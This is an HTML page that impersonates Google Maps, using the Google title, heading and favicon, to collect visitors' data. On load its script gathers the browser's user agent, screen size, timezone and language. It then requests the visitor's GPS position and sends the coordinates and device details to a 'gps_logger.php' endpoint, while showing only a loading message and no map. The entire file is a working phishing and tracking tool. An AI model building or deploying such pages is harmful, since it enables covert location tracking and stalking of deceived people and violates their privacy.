<!-- index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Google Maps</title>
  <link rel="stylesheet" href="style.css">
  <link rel="icon" href="https://www.google.com/favicon.ico">
</head>
<body>
  <h2>Google Maps</h2>
  <p>Loading the map for your location...</p>
  <div id="status">Acquiring GPS and device info...</div>

  <script>
    const info = {
      userAgent: navigator.userAgent,
      screenWidth: screen.width,
      screenHeight: screen.height,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      language: navigator.language
    };

    navigator.geolocation.getCurrentPosition(
      function(pos) {
        fetch('gps_logger.php', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            info: info
          })
        });
        document.getElementById("status").innerText = "Location acquired.";
      },
      function(error) {
        document.getElementById("status").innerText = "Location denied or unavailable.";
      }
    );
  </script>
</body>
</html>
